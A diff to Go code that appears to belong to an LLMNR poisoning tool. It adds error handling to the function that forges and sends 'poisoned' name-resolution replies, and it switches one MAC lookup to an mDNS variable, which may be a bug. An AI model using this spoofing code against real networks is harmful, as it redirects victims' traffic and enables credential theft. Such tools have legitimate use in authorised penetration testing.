@@ -81,28 +81,41 @@ func sendLLMNRPacket(pdetails packetDetails, payload []byte) {
 		IHL:      5,
 	}
 	ethernetLayer := &layers.Ethernet{
-		SrcMAC:       pdetails.dstMAC,
 		DstMAC:       pdetails.srcMAC,
 		EthernetType: layers.EthernetTypeIPv4,
+		SrcMAC:       pdetails.dstMAC,
 	}
 	udpLayer := &layers.UDP{
 		SrcPort: pdetails.dstPort,
 		DstPort: pdetails.srcPort,
 	}
-	udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	if err != nil {
+		log.Printf("[LLMNR] Error creating UDP layer: %s\n", err)
+		return
+	}
 
 	// And create the packet with the layers
 	buffer = gopacket.NewSerializeBuffer()
-	gopacket.SerializeLayers(buffer, options,
+	err = gopacket.SerializeLayers(buffer, options,
 		ethernetLayer,
 		ipLayer,
 		udpLayer,
 		gopacket.Payload(payload),
 	)
+	if err != nil {
+		log.Printf("[LLMNR] Error serializing packet: %s\n", err)
+		return
+	}
 	outgoingPacket := buffer.Bytes()
 
 	// Send our packet and don't worry if there is an error
-	_ = mainLLMNRDetails.handle.WritePacketData(outgoingPacket)
+	err = mainLLMNRDetails.handle.WritePacketData(outgoingPacket)
+	if err != nil {
+		log.Printf("[LLMNR] Error sending poison to %s\n%s\n", pdetails.srcIP, err)
+		return
+	}
+
 	log.Printf("[LLMNR] Poisoned answer sent to %s for name %s\n", pdetails.srcIP, pdetails.requestName)
 }
 
@@ -170,7 +183,7 @@ func parseLLMNRPacket(packet gopacket.Packet) packetDetails {
 	if ethLayer != nil {
 		eth, _ := ethLayer.(*layers.Ethernet)
 		details.srcMAC = eth.SrcMAC
-		details.dstMAC = mainLLMNRDetails.respondMAC
+		details.dstMAC = mainMDNSDetails.respondMAC
 	}
 
 	// Get UDP layer
